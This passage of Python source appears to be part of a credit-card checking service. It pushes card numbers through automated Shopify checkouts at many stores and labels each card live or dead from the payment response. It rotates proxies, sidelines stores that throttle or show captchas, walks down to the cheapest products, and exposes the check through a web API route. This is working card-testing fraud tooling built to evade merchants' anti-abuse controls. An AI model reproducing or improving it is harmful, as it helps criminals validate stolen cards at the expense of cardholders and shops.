                except Exception:
                    pass
            if not token:
                # The vault said the card is not a card.  That is a word
                # about the card, and it is passed on as such.
                _low = vault_said.lower()
                if any(k in _low for k in ("invalid", "not valid", "malformed",
                                           "incorrect", "does not match",
                                           "luhn", "unsupported card",
                                           "not a valid")):
                    return _r("INVALID_CARD",
                              message=("The card vault would not take the "
                                       "card: %s" % vault_said)[:900])
                return _r("TOKENIZATION_FAILED",
                          message=("The card vault did not answer: %s"
                                   % vault_said)[:900],
                          is_site_error=True)

            # â”€â”€ 5b. The order is asked about with the card in it â”€â”€â”€â”€â”€â”€â”€â”€
            # The shop wants to see the payment of the card before the
            # order is sent, and when it does not see it, it says that
            # it is waiting for its terms and refuses the order.
            #
            # And when the shop moves its prices or its taxes, the
            # numbers of the order move with them, and the order has to
            # be sent with the new numbers.  So this is done again when
            # the shop says that the order has changed under it.
            _pay_terms_id = ""

            async def _propose_the_payment():
                nonlocal sst, running_total, price, shipping_amount
                nonlocal tax_amount, delivery_strategy, _pay_terms_id
                try:
                    _pay_total = "%.2f" % float(running_total)
                except (TypeError, ValueError):
                    _pay_total = str(running_total or "0.00")
                _pay_addr = {
                    "streetAddress": {
                        "address1": street, "address2": "", "city": city,
                        "countryCode": country_code, "postalCode": s_zip,
                        "firstName": first, "lastName": last,
                        "zoneCode": state, "phone": phone,
                    },
                }
                _pay_vars = copy.deepcopy(deliv_vars)
                _pay_terms = {
                    "totalAmount": {"value": {"amount": _pay_total,
                                              "currencyCode": currency}},
                    "paymentLines": [{
                        "paymentMethod": {
                            "directPaymentMethod": {
                                "paymentMethodIdentifier": payment_identifier,
                                "sessionId":               token,
                                "billingAddress":          _pay_addr,
                                "cardSource":              None,
                            }
                        },
                        "amount": {"value": {"amount": _pay_total,
                                              "currencyCode": currency}},
                        "dueAt": None,
                    }],
                    "billingAddress": _pay_addr,
                }
                # The terms of the payment of the shop are given back to
                # it, for the shop is waiting for them: it says the
                # order is waiting for its terms and refuses it.
                if _pay_terms_id:
                    _pay_vars["payment"]["paymentFlexibilityTermsId"] = \
                        _pay_terms_id
                _pr = await session.post(
                    graphql_url,
                    params={"operationName": "Proposal"},
                    headers=gql_headers,
                    json={"query": QUERY_PROPOSAL_DELIVERY,
                          "variables": _pay_vars,
                          "operationName": "Proposal"},
                )
                _p_resp = orjson.loads(_pr.content)
                _p_sst = _pr.headers.get("x-checkout-one-session-token")
                if _p_sst:
                    sst = _p_sst
                    gql_headers["x-checkout-one-session-token"] = sst
                _p_result = (
                    (_p_resp.get("data", {}).get("session", {}) or {})
                    .get("negotiate", {}).get("result", {}) or {}
                )
                if _p_result.get("__typename") == "SubmittedForCompletion":
                    return "placed"
                _p_seller = _p_result.get("sellerProposal") or {}
                # the terms of the payment of the shop, for the shop is
                # waiting for them
                _p_payment = _p_seller.get("payment") or {}
                _p_template = _p_payment.get(
                    "paymentFlexibilityPaymentTermsTemplate") or {}
                if _p_template.get("id"):
                    _pay_terms_id = str(_p_template.get("id"))
                # the shop's new numbers of the order
                _p_total = _p_seller.get("total") or {}
                _p_amt = ((_p_total.get("value") or {}).get("amount")
                           or _p_total.get("amount"))
                if _p_amt:
                    try:
                        running_total = float(_p_amt)
                        price = "%.2f" % float(running_total)
                    except (TypeError, ValueError):
                        pass
                _p_delivery = _p_seller.get("delivery") or {}
                _p_lines = _p_delivery.get("deliveryLines") or []
                if _p_lines:
                    _p_sel = _p_lines[0].get("selectedDeliveryStrategy") or {}
                    if _p_sel.get("handle"):
                        delivery_strategy = _p_sel["handle"]
                    for _s in (_p_lines[0].get("availableDeliveryStrategies") or []):
                        try:
                            _a = ((_s.get("amount") or {}).get("value") or {}).get("amount")
                            shipping_amount = float(_a)
                            break
                        except (TypeError, ValueError):
                            continue
                _p_tax = _p_seller.get("tax") or {}
                if _p_tax.get("__typename") == "FilledTaxTerms":
                    _p_tax_amt = _p_tax.get("totalTaxAmount") or {}
                    try:
                        tax_amount = float(
                            (_p_tax_amt.get("value") or {}).get("amount")
                            or _p_tax_amt.get("amount") or "0")
                    except (TypeError, ValueError):
                        pass
                return "asked"

            try:
                if await _propose_the_payment() == "placed":
                    return _r("ORDER_PLACED", charged="True", approved="True",
                              message="Order placed successfully")
            except Exception as ex:
                log.debug("the payment proposal could not be made: %s", ex)

            # â”€â”€ 6. Submit for completion â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
            # The shape of the address of the payment: a street address
            # with the name of the one who buys in it, and the postal
            # code in its own place.  This is the shape the shop takes,
            # and it was given the wrong one, so the shop said the name
            # was missing and the card was never judged.
            billing_addr = {
                "streetAddress": {
                    "address1": street, "address2": "", "city": city,
                    "countryCode": country_code, "postalCode": s_zip,
                    "firstName": first, "lastName": last,
                    "zoneCode": state, "phone": phone,
                },
            }

            # The amount of the whole order: the thing, the delivery and
            # the tax.  The shop checks that the payment covers it, so
            # the amount has to be the real one.
            try:
                _submit_total = "%.2f" % float(running_total)
            except (TypeError, ValueError):
                _submit_total = str(running_total or "0.00")

            def _build_submit_body() -> dict:
                submit_deliv_line = copy.deepcopy(deliv_vars["delivery"]["deliveryLines"][0])
                submit_deliv_line["selectedDeliveryStrategy"] = {
                    "deliveryStrategyByHandle": {
                        "handle": delivery_strategy, "customDeliveryRate": False
                    },
                    "options": {"phone": phone},
                }
                submit_deliv_line["expectedTotalPrice"] = {"any": True}

                submit_merch = copy.deepcopy(deliv_vars["merchandise"])
                for ml in submit_merch.get("merchandiseLines", []):
                    ml["expectedTotalPrice"] = {"any": True}

                return {
                    "query": MUTATION_SUBMIT,
                    "variables": {
                        "input": {
                            "sessionInput":       {"sessionToken": sst},
                            "queueToken":         queue_token or "",
                            "discounts":          {"lines": [], "acceptUnexpectedDiscounts": True},
                            "delivery": {
                                "deliveryLines":              [submit_deliv_line],
                                "noDeliveryRequired":         [],
                                "useProgressiveRates":        True,
                                "prefetchShippingRatesStrategy": None,
                                "supportsSplitShipping":      True,
                            },
                            "merchandise":  submit_merch,
                            "payment": {
                                "totalAmount": {"value": {
                                    "amount": _submit_total,
                                    "currencyCode": currency}},
                                "paymentLines": [{
                                    "paymentMethod": {
                                        "directPaymentMethod": {
                                            "paymentMethodIdentifier": payment_identifier,
                                            "sessionId":               token,
                                            "billingAddress":          billing_addr,
                                            "cardSource":              None,
                                        }
                                    },
                                    "amount": {"value": {
                                        "amount": _submit_total,
                                        "currencyCode": currency}},
                                    "dueAt": None,
                                }],
                                "billingAddress": billing_addr,
                                # The terms of the payment of the shop go
                                # with the order, for the shop is waiting
                                # for them.
                                **({"paymentFlexibilityTermsId": _pay_terms_id}
                                   if _pay_terms_id else {}),
                            },
                            "buyerIdentity":      copy.deepcopy(deliv_vars["buyerIdentity"]),
                            "taxes": {
                                "proposedAllocations":         None,
                                "proposedTotalAmount":         {"any": True},
                                "proposedTotalIncludedAmount": None,
                                "proposedMixedStateTotalAmount": None,
                                "proposedExemptions":          [],
                            },
                            "tip":                {"tipLines": []},
                            "note":               {"message": None, "customAttributes": []},
                            "localizationExtension": {"fields": []},
                            "nonNegotiableTerms": None,
                            "optionalDuties":     {"buyerRefusesDuties": False},
                            **({"checkpointData": checkpoint_data} if checkpoint_data else {}),
                        },
                        "attemptToken": attempt_token,
                        "metafields": [],
                        "analytics": {"requestUrl": checkout_url},
                    },
                    "operationName": "SubmitForCompletion",
                }

            s_resp: dict = {}
            for submit_attempt in range(3):
                try:
                    _body = _build_submit_body()
                    try:
                        _pv = _body.get("variables", {}).get("purchaseProposal", {})
                        with open("/tmp/npr_body.txt", "a",
                                  encoding="utf-8") as _bf:
                            _bf.write("PAY: " + json.dumps(_pv.get("payment"), default=str)[:900] + "\n")
                            _bf.write("BUYER: " + json.dumps(_pv.get("buyerIdentity"), default=str)[:600] + "\n----\n")
                    except Exception:
                        pass
                    sr = await session.post(
                        graphql_url,
                        params={"operationName": "SubmitForCompletion"},
                        headers=gql_headers,
                        json=_body,
                    )
                    s_resp = orjson.loads(sr.content)
                    _sub_sst = sr.headers.get("x-checkout-one-session-token")
                    if _sub_sst:
                        sst = _sub_sst
                        gql_headers["x-checkout-one-session-token"] = sst
                except (asyncio.TimeoutError, RequestsError):
                    return _r("TIMEOUT", message="Submit timed out", is_site_error=True)
                except Exception as ex:
                    log.debug("submit exception: %s", ex)
                    return _r("SUBMIT_FAILED", message=str(ex)[:100], is_site_error=True)

                log.debug("submit[%d] response typename: %s", submit_attempt,
                          (s_resp.get("data") or {}).get("submitForCompletion", {}).get("__typename"))

                s_data = (s_resp.get("data") or {}).get("submitForCompletion") or {}
                # The shop says the order has changed under it: the
                # prices, the taxes or the terms are not the ones that
                # were asked about.  So the order is asked about again
                # and sent again, and only then is the card judged.
                _stale = _the_order_changed(
                    list(s_data.get("errors") or [])
                    + list(s_resp.get("errors") or []))
                if not _stale and s_data.get("__typename"):
                    _stale = _the_order_changed([s_data])
                if _stale and submit_attempt < 2:
                    log.debug("submit[%d] the order changed under us: %s",
                              submit_attempt, _stale)
                    try:
                        # the order is asked about with the card in it
                        # again, so that the new numbers of the order
                        # are the ones the order is sent with
                        await _propose_the_payment()
                        continue
                    except Exception as ex:
                        log.debug("the order could not be asked about again: %s", ex)
                if not s_data:
                    errs = s_resp.get("errors") or []
                    log.debug("submit no data, top-level errors: %s", errs)
                    try:
                        with open("/tmp/npr_shop_words.txt", "a",
                                  encoding="utf-8") as _wf:
                            _wf.write("TOP: " + str(errs)[:1500] + "\n")
                    except Exception:
                        pass
                    if errs:
                        for err_item in errs:
                            for fld in ("code", "message"):
                                val = str(err_item.get(fld) or "")
                                if val:
                                    norm = _normalize_response(val)
                                    if norm != "CARD_DECLINED":
                                        approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED") else "False"
                                        return _r(norm, approved=approved, message=val[:400])
                    return _r("GRAPHQL_ERROR", message="Empty submit response", is_site_error=True)

                stype = s_data.get("__typename", "")

                if stype == "SubmitRejected":
                    sub_errs = s_data.get("errors") or []
                    all_confirmable = all(
                        e.get("__typename") == "ConfirmChangeViolation" for e in sub_errs
                    ) if sub_errs else False
                    if all_confirmable and submit_attempt < 2:
                        log.debug("submit[%d] ConfirmChangeViolation, retrying", submit_attempt)
                        await asyncio.sleep(0.5)
                        continue
                break

            stype = s_data.get("__typename", "")

            if stype in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
                receipt = s_data.get("receipt") or {}
                rtype   = receipt.get("__typename", "")

                if rtype == "ProcessedReceipt":
                    return _r("ORDER_PLACED", charged="True", approved="True",
                              message="Order placed successfully")
                if rtype == "ActionRequiredReceipt":
                    return _r("3DS_REQUIRED", approved="True",
                              message="3D Secure challenge required")
                if rtype == "FailedReceipt":
                    pe      = receipt.get("processingError") or {}
                    pe_type = pe.get("__typename", "")
                    log.debug("FailedReceipt processingError: %s", pe)
                    if pe_type in ("InventoryClaimFailure", "InventoryReservationFailure"):
                        return _r("NO_PRODUCT", message="Inventory failure", is_site_error=True)
                    if pe_type == "OrderCreationFailure":
                        return _r("ORDER_CREATION_FAILED",
                                  message="Order creation failure",
                                  is_site_error=True)
                    code = str(pe.get("code") or "").upper()
                    msg  = str(pe.get("messageUntranslated") or "").upper()
                    raw  = code if code and code not in ("GENERIC_ERROR", "") else msg
                    norm = _normalize_response(raw) if raw else "CARD_DECLINED"
                    # An expired card is a dead card, not a live one.
                    approved = "True" if norm in ("INSUFFICIENT_FUNDS",
                                                  "INVALID_CVC", "3DS_REQUIRED") else "False"
                    return _r(norm, approved=approved,
                              message=(code or msg or norm)[:900])

                rid = receipt.get("id")
                if rid:
                    poll_body = {
                        "query":         QUERY_POLL,
                        "variables":     {"receiptId": rid, "sessionToken": sst},
                        "operationName": "PollForReceipt",
                    }
                    await asyncio.sleep(2)
                    for _ in range(6):
                        try:
                            pr = await session.post(
                                graphql_url,
                                params={"operationName": "PollForReceipt"},
                                headers=gql_headers,
                                json=poll_body,
                            )
                            pd = (orjson.loads(pr.content)).get("data", {}).get("receipt") or {}
                            pt = pd.get("__typename", "")
                            if pt == "ProcessedReceipt":
                                return _r("ORDER_PLACED", charged="True", approved="True",
                                          message="Order placed successfully")
                            if pt == "ActionRequiredReceipt":
                                return _r("3DS_REQUIRED", approved="True",
                                          message="3D Secure challenge required")
                            if pt == "FailedReceipt":
                                pe      = pd.get("processingError") or {}
                                pe_type = pe.get("__typename", "")
                                if pe_type in ("InventoryClaimFailure", "InventoryReservationFailure"):
                                    return _r("NO_PRODUCT", message="Inventory failure", is_site_error=True)
                                code = str(pe.get("code") or "").upper()
                                msg  = str(pe.get("messageUntranslated") or "").upper()
                                if code == "CAPTCHA_REQUIRED":
                                    # the shop puts up a picture for everybody:
                                    # it is put aside for a while, so the next
                                    # card goes to a shop that answers
                                    _store_penalise(site_url)
                                    return _r("CAPTCHA_REQUIRED", approved="False",
                                              message="Captcha required", is_site_error=True)
                                raw  = code if code and code not in ("GENERIC_ERROR", "") else msg
                                norm = _normalize_response(raw) if raw else "CARD_DECLINED"
                                # An expired card is a dead card, not a live one.
                                approved = "True" if norm in ("INSUFFICIENT_FUNDS",
                                                              "INVALID_CVC", "3DS_REQUIRED") else "False"
                                return _r(norm, approved=approved,
                                          message=(code or msg or norm)[:900])
                            if pt in ("ProcessingReceipt", "WaitingReceipt"):
                                delay = pd.get("pollDelay", 3000) / 1000
                                await asyncio.sleep(min(delay, 4))
                                continue
                        except Exception:
                            pass
                        break

                return _r("CARD_DECLINED",
                          message="Unclassified receipt response")

            if stype == "SubmitFailed":
                reason = str(s_data.get("reason") or "")
                return _r(_normalize_response(reason), message=reason[:900])

            if stype == "SubmitRejected":
                errs = s_data.get("errors") or []
                log.debug("SubmitRejected errors: %s", errs)
                try:
                    with open("/tmp/npr_shop_words.txt", "a",
                              encoding="utf-8") as _wf:
                        _wf.write("REJECTED: " + str(errs)[:1500] + "\n")
                except Exception:
                    pass
                try:
                    with open("/tmp/npr_shop_words.txt", "a",
                              encoding="utf-8") as _wf:
                        _wf.write(str(errs)[:1500] + "\n")
                except Exception:
                    pass
                if errs:
                    best_code = "CARD_DECLINED"
                    best_msg  = ""
                    # The words of the shop are kept, even when the code
                    # is the general one: the person is to see why the
                    # card was refused, and not only a word that says
                    # nothing.
                    fallback_msg = ""
                    for err_item in errs:
                        # the words a person reads come first, and the
                        # code of the shop comes after
                        words = ""
                        for fld in ("localizedMessage", "nonLocalizedMessage",
                                    "messageUntranslated", "code"):
                            val = str(err_item.get(fld) or "").strip()
                            if val:
                                words = val
                                break
                        for fld in ("code", "nonLocalizedMessage", "localizedMessage",
                                    "localizedMessageHtml"):
                            val = str(err_item.get(fld) or "").upper()
                            if not val or val in ("GENERIC_ERROR", "PAYMENT_FAILED",
                                                  "PAYMENT ERROR"):
                                continue
                            if not fallback_msg and not _is_shop_side(val):
                                fallback_msg = words or val
                            norm = _normalize_response(val)
                            if norm != "CARD_DECLINED":
                                best_code = norm
                                best_msg  = words or val
                                break
                        if best_code != "CARD_DECLINED":
                            break
                    # An expired card is a dead card, not a live one.
                    approved = "True" if best_code in ("INSUFFICIENT_FUNDS",
                                                       "INVALID_CVC", "3DS_REQUIRED") else "False"
                    if best_code == "SITE_ERROR":
                        # the shop is busy with its own terms or its
                        # own delivery: it is put aside for a while
                        _store_penalise(site_url)
                    if best_code == "SITE_ERROR":
                        # the shop is busy with its own terms or its
                        # own delivery: it is put aside for a while
                        _store_penalise(site_url)
                    return _r(best_code, approved=approved,
                              message=(best_msg or fallback_msg or best_code)[:900])
                return _r("CARD_DECLINED", message="No error detail")

            if stype == "Throttled":
                return _r("THROTTLED", message="Throttled by Shopify", is_site_error=True)
            if stype == "CheckpointDenied":
                return _r("CHECKPOINTDENIED", message="Checkpoint denied", is_site_error=True)

            return _r("CARD_DECLINED", message=f"Unknown submit type: {stype}")

        except _PriceOverMax:
            # The real total is over the cap -- let the caller try the next
            # cheap product instead of reporting a site error.
            raise
        except (asyncio.TimeoutError, RequestsError):
            return _r("TIMEOUT", message="Request timed out", is_site_error=True)
        except Exception as ex:
            log.debug("validate_card exception: %s", ex, exc_info=True)
            err_str = f"{type(ex).__name__}: {str(ex)[:100]}"
            err_lower = err_str.lower()
            if any(k in err_lower for k in ("proxy", "tunnel", "407",
                                             "could not connect to proxy",
                                             "connection to proxy")):
                return _r("PROXY_ERROR", message=err_str, proxy_dead=True, is_site_error=True)
            return _r("SITE_ERROR", message=err_str, is_site_error=True)
        finally:
            if owned:
                res = session.close()
                if asyncio.iscoroutine(res):
                    await res


async def validate_card_with_retry(
    cc:         str,
    month:      str,
    year:       str,
    cvv:        str,
    site_url:   str,
    variant_id: Optional[str] = None,
    proxy_str:  Optional[str] = None,
    max_price:  Optional[float] = None,
    min_price:  Optional[float] = None,
    max_attempts: int = 6,
    hold_the_slot: bool = False,
) -> dict:
    """Run validate_card, retrying with the next cheap product when the
    real total (product + shipping + tax) exceeds the price cap.

    Shipping and tax are only known after the negotiation, so the cheapest
    item on a store is not always the cheapest order.  This keeps walking
    down the candidate list until one fits the cap.
    """
    last: Optional[dict] = None
    for attempt in range(max_attempts):
        try:
            result = await validate_card(
                cc, month, year, cvv, site_url,
                variant_id=variant_id, proxy_str=proxy_str,
                max_price=max_price, min_price=min_price, candidate_index=attempt,
                hold_the_slot=hold_the_slot,
            )
        except _PriceOverMax as e:
            # Price over the cap for this candidate -- try the next one.
            last = {
                "Response": f"PRICE_OVER_MAX: {e}",
                "Message": str(e),
                "code": "PRICE_OVER_MAX",
                "decline_code": "PRICE_OVER_MAX",
                "Gateway": "Shopify Payments",
                "Price": "0.00",
                "Proxy": "Live",
                "Status": False,
                "Gate": "Shopify Payments",
                "CC": f"{cc}|{month}|{year}|{cvv}",
                "Product": "",
                "Site": site_url,
                "Charged": "False",
                "Approved": "False",
                "Time": "0.0s",
                "Retry": True,
            }
            if variant_id:
                break
            continue
        resp = str(result.get("Response", ""))
        if "PRICE_OVER_MAX" not in resp:
            return result
        last = result
        # A caller-specified variant cannot be swapped out.
        if variant_id:
            break
    if last is not None:
        return last
    return {
        "Response": "NO_PRODUCT",
        "Message": "No product under the price cap",
        "code": "NO_PRODUCT",
        "decline_code": "NO_PRODUCT",
        "Gateway": "Shopify Payments",
        "Price": "0.00",
        "Proxy": "Live",
        "Status": False,
        "Gate": "Shopify Payments",
        "CC": f"{cc}|{month}|{year}|{cvv}",
        "Product": "",
        "Site": site_url,
        "Charged": "False",
        "Approved": "False",
        "Time": "0.0s",
        "Retry": True,
    }


def _site_has_product_in_band(site: str, min_price: float, max_price: float) -> bool:
    """True when the store has something to sell inside the band.

    Nothing is known about a store that was never asked, so it is given
    the chance.  A store whose product list is known and has nothing
    inside the band is skipped: asking it again would only end in the
    same answer.
    """
    base = site if site.startswith("http") else "https://" + site
    hostname = urlparse(base).netloc
    if time.time() < _band_block.get((hostname, f"{max_price:.2f}"), 0.0):
        return False
    entry = _product_cache.get(f"{hostname}|{max_price:.2f}")
    if not entry:
        return True
    # The list could not be fetched.  That says nothing about the price
    # of the store, so the store gets its chance.
    if not entry.get("ok"):
        return True
    candidates = entry.get("candidates") or []
    if not candidates:
        return False
    for c in candidates:
        try:
            price = float(c.get("price"))
        except (TypeError, ValueError):
            continue
        if min_price <= price <= max_price:
            return True
    return False


async def validate_card_across_sites(
    cc:         str,
    month:      str,
    year:       str,
    cvv:        str,
    sites:      list[str],
    proxy_str:  Optional[str] = None,
    max_price:  Optional[float] = None,
    min_price:  Optional[float] = None,
    max_sites:  int = 20,
    tries:      Optional[int] = None,
    budget:     Optional[int] = None,
) -> dict:
    """Try each merchant until one returns a real card verdict.

    A site that is down, requires a login, or has nothing under the price
    cap is skipped -- the next one gets a turn.
    """
    last: Optional[dict] = None
    tried = 0
    skipped = 0
    attempts = 0
    #
    # The stores that are free right now.  A store that is busy, or
    # that is put aside, or that has nothing inside the band, is still
    # a store when there is no other one: the card is put in front of
    # it rather than being told it failed when no store was asked at
    # all.  A card that is told it failed when nothing was tried is a
    # card that is told a lie, and every card of the run is told the
    # same lie.
    def _is_free(one):
        h = _host_of(one)
        return (time.time() >= _throttle_block.get(h, 0.0)
                and time.time() >= _no_gateway_block.get(h, 0.0))

    _any_free = any(_is_free(one) for one in sites[:max_sites])
    for site in sites[:max_sites]:
        host = _host_of(site)
        # A store that said it was tired of being asked is not asked
        # again for a while.  The cards go to the stores that still
        # answer.
        if time.time() < _throttle_block.get(host, 0.0):
            skipped += 1
            if _any_free:
                continue
        # A shop that does not take cards at all will not start taking
        # them, so it is not asked again for a long time.
        if time.time() < _no_gateway_block.get(host, 0.0):
            skipped += 1
            if _any_free:
                continue
        # A shop that asks for a captcha is left alone for a while,
        # for the same reason: the captcha is not always answered,
        # and the card is better spent at a shop that answers.
        if time.time() < _captcha_block.get(host, 0.0):
            skipped += 1
            continue
        # A store that has nothing to sell inside the band is skipped
        # without a checkout attempt.  The product list is cached per
        # store and band, so this is known after the first card.  A
        # store that is skipped is not an attempt: it does not use up
        # the card's time.
        if min_price and not _site_has_product_in_band(
            site, float(min_price), float(max_price if max_price is not None else MAX_PRICE)
        ):
            skipped += 1
            if _any_free:
                continue
        # A card does not walk through every shop in the list: a shop
        # that is slow takes the card's time with it.  The next card
        # starts further along the list, so the shops all get their turn.
        #
        # The budget counts the attempts, not the shops: a card that
        # goes from shop to shop and from address to address would hold
        # its place for minutes, and a card that is answered quickly is
        # worth more than a card that is answered eventually.
        if (tried >= (tries if tries is not None else SITE_TRIES_PER_CARD)
                or attempts >= (budget if budget is not None
                                else CARD_ATTEMPT_BUDGET)):
            break
        tried += 1
        # The addresses to ask this shop from.  The caller gives a list
        # of them, so every card leaves from a different address.  A
        # shop that is slow or that puts up a challenge is asked again
        # from the next address before it is given up on: that costs one
        # short attempt instead of the whole card.
        addresses = [p.strip() for p in (proxy_str or "").split(",") if p.strip()]
        if not addresses:
            # The caller gave no address, so the check goes straight
            # out.  An address makes the check five times longer, and a
            # shop that is tired of this place is dealt with when it
            # happens: the card is asked again from another place.
            addresses = [None]

        # The addresses this shop refused are left out, so the card goes
        # to an address the shop has not turned away yet.
        free = [a for a in addresses
                if time.time() >= _address_block.get((host, a), 0.0)]
        if not free:
            free = addresses[:1]
        # The pairs that worked before go first.
        free.sort(key=lambda a: -_pair_wins.get((host, a), 0))
        free = free[:ADDRESSES_PER_STORE]

        result: dict = {}
        resp = ""
        for address in free:
            if attempts >= CARD_ATTEMPT_BUDGET:
                break
            attempts += 1
            attempt_started = time.time()
            # One attempt is one shop and one address.  The checkout
            # makes a few calls, and an address that does not answer
            # would take the card's whole time, so an attempt is given
            # a set amount of time and then left.
            # The card takes its place in the shop's queue first, and
            # only then its own time starts.  A card that waits for a
            # busy shop is not a card that timed out.
            sem = _site_semaphores[host]
            have_slot = False
            try:
                await asyncio.wait_for(sem.acquire(), timeout=SHOP_QUEUE_WAIT)
                have_slot = True
            except asyncio.TimeoutError:
                have_slot = False
            try:
                try:
                    result = await asyncio.wait_for(
                        validate_card_with_retry(
                            cc, month, year, cvv, site,
                            proxy_str=address, max_price=max_price, min_price=min_price,
                            hold_the_slot=have_slot,
                        ),
                        timeout=ATTEMPT_SECONDS,
                    )
                except asyncio.TimeoutError:
                    result = {
                        "Response": "TIMEOUT",
                        "Message": "The shop did not answer in time",
                        "code": "TIMEOUT",
                        "decline_code": "TIMEOUT",
                        "Gateway": "Shopify Payments",
                        "Price": "0.00",
                        "Proxy": address or "Live",
                        "Status": False,
                        "Gate": "Shopify Payments",
                        "CC": f"{cc}|{month}|{year}|{cvv}",
                        "Product": "",
                        "Site": site,
                        "Charged": "False",
                        "Approved": "False",
                        "Time": "0.0s",
                        "Retry": True,
                    }
            finally:
                if have_slot:
                    sem.release()
            # How long the shop itself took is written down, so the
            # quick shops are asked first next time.  The time of
            # waiting for the shop is not counted: a shop that is
            # quick but busy is not a slow shop.
            try:
                shop_time = float(str(result.get("Time", "0s")).rstrip("s"))
            except (TypeError, ValueError):
                shop_time = 0.0
            if shop_time <= 0.0:
                # The shop did not answer, so it is not known to be a
                # quick one.  The time it took is what it took.
                shop_time = time.time() - attempt_started
            _store_time[host] = shop_time
            _save_the_store_times()
            resp = str(result.get("Response", ""))
            the_code = resp.split(":", 1)[0].strip().upper()
            # A shop that is tired of being asked says so, and that is
            # about the shop and not about the card.
            is_throttled = ("THROTTLED" in resp.upper()
                            or "RATE_LIMIT" in resp.upper()
                            or "TOO_MANY" in resp.upper())
            if the_code in ADDRESS_PROBLEMS:
                # This shop turned this address away.  The pair is put
                # aside so the next card leaves from somewhere else.
                _address_block[(host, address)] = time.time() + ADDRESS_BLOCK_SECONDS
                continue
            break
        # Nothing worked from the addresses the caller gave.  One more
        # address from the pool is tried before the shop is left alone.
        the_code = resp.split(":", 1)[0].strip().upper()
        if the_code in ADDRESS_PROBLEMS:
            alt = _pick_rescue_proxy(proxy_str)
            if alt and alt not in addresses[:ADDRESSES_PER_STORE]:
                result = await validate_card_with_retry(
                    cc, month, year, cvv, site,
                    proxy_str=alt, max_price=max_price, min_price=min_price,
                )
                resp = str(result.get("Response", ""))
                the_code = resp.split(":", 1)[0].strip().upper()
        # A card verdict (or a bank decline) is a real answer -- stop here.
        if the_code not in ("NO_PRODUCT", "CART_FAILED", "SITE_REQUIRES_LOGIN",
                            "NO_SESSION_TOKEN", "NO_ATTEMPT_TOKEN",
                            "NO_SHOPIFY_PAYMENTS_GATEWAY", "CHECKPOINTDENIED",
                            "THROTTLED", "TIMEOUT", "SITE_ERROR", "PROXY_ERROR",
                            "NO_SELLER_PROPOSAL", "GRAPHQL_ERROR",
                            "NO_PAYMENT_REQUIRED", "CART_ERROR", "PRICE_OVER_MAX",
                        # A store whose card vault refuses the card is that
                        # store's own rule, not the bank's answer, so the
                        # next store gets a turn.  When every store refuses
                        # it, the last answer is the card's after all.
                        "TOKENIZATION_FAILED"):
            _store_pardon(site)
            _store_wins[_host_of(site)] += 1
            _pair_wins[(host, address)] += 1
            return result
        # The item was inside the band but the order came out over the
        # cap, so this shop cannot make this order at this price.  The
        # cards are not taken to it again for a while.
        if resp.startswith("PRICE_OVER_MAX") and max_price:
            # The shop's orders come to more than the cap, so it is not
            # a shop for this price at all.  It is asked again later,
            # when the price it wants may have come down.
            _band_block[(host, f"{float(max_price if max_price is not None else MAX_PRICE):.2f}")] = time.time() + BAND_BLOCK_SECONDS
            # and the shop itself is put aside for a while, so the
            # cards go to the shops that have something cheap
            _store_cooldown[host] = time.time() + BAND_BLOCK_SECONDS
            # and the shop itself is put aside for that price, so the
            # next card does not wait for the same dear thing
            _store_cooldown[host] = time.time() + BAND_BLOCK_SECONDS
        # A shop that is tired of being asked is put aside, so the cards
        # go to the shops that still answer.  It is not a fault of the
        # card, so it is not counted against the card either.
        if is_throttled:
            _throttle_block[host] = time.time() + THROTTLE_BLOCK_SECONDS
        # A shop that did not answer, or that has nothing for this
        # card, is put aside for a while: the next card does not wait
        # for it.
        if the_code in ("TIMEOUT", "NO_PRODUCT", "NO_SESSION_TOKEN",
                        "CART_FAILED", "SITE_ERROR", "PRICE_OVER_MAX"):
            _store_cooldown[host] = time.time() + BAND_BLOCK_SECONDS
        # A shop that does not take cards, or that gives no session to
        # work with, is put aside for a long time.  It will say the
        # same again, and the card's time is better spent elsewhere.
        if the_code in ("NO_SHOPIFY_PAYMENTS_GATEWAY", "NO_SESSION_TOKEN"):
            _no_gateway_block[host] = time.time() + NO_GATEWAY_BLOCK_SECONDS
        # A store that asks for a captcha is put aside for a while.
        # The captcha is not always answered, and a card that waits
        # for an answer that will not come is a card that never
        # reaches the bank.  So the store is asked again later, and
        # the cards go to the stores that answer now.
        if the_code == "CAPTCHA_REQUIRED":
            _captcha_block[host] = time.time() + CAPTCHA_BLOCK_SECONDS
        # The store could not do the checkout.  It is put aside for a
        # while so the next cards go to the stores that still answer.
        #
        # A store that simply has nothing in the price band is not
        # broken: it is asked for a $1 to $2 item and it sells a $5
        # one.  Benching it would empty the pool of good stores for
        # nothing, so only a real failure puts it aside.
        if not (the_code == "NO_PRODUCT" and (min_price or 0) > 0):
            _store_penalise(site)
        last = result
    if last is not None:
        return last
    return {
        "Response": "NO_PRODUCT",
        "Message": f"No usable site ({tried} shops asked, {skipped} without an item in the band)",
        "code": "NO_PRODUCT",
        "decline_code": "NO_PRODUCT",
        "Gateway": "Shopify Payments",
        "Price": "0.00",
        "Proxy": "Live",
        "Status": False,
        "Gate": "Shopify Payments",
        "CC": f"{cc}|{month}|{year}|{cvv}",
        "Product": "",
        "Site": "",
        "Charged": "False",
        "Approved": "False",
        "Time": "0.0s",
        "Retry": True,
    }


# ---------------------------------------------------------------------------
# Valid gateway response codes (site is live)
# ---------------------------------------------------------------------------
LIVE_RESPONSES = frozenset({
    "ORDER_PLACED", "3DS_REQUIRED", "INSUFFICIENT_FUNDS",
    "CARD_DECLINED", "INVALID_CVC", "EXPIRED_CARD",
    "INVALID_CARD", "THROTTLED",
})


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------

@app.get("/shopify")
async def shopify_route(
    site:      Optional[str] = Query(None, description="Shopify store URL (optional - falls back to site.txt)"),
    cc:        Optional[str] = Query(None, description="cc|mm|yy|cvv or cc|mm|yyyy|cvv"),
    proxy:     Optional[str] = Query(None, description="ip:port or ip:port:user:pass"),
    max_price: Optional[float] = Query(None, description="Max product price override"),
    min_price: Optional[float] = Query(None, description="Min product price override"),
    key:       Optional[str] = Query(None, description="API key"),
    _tries:    Optional[int] = Query(None, include_in_schema=False),
    _budget:   Optional[int] = Query(None, include_in_schema=False),
):
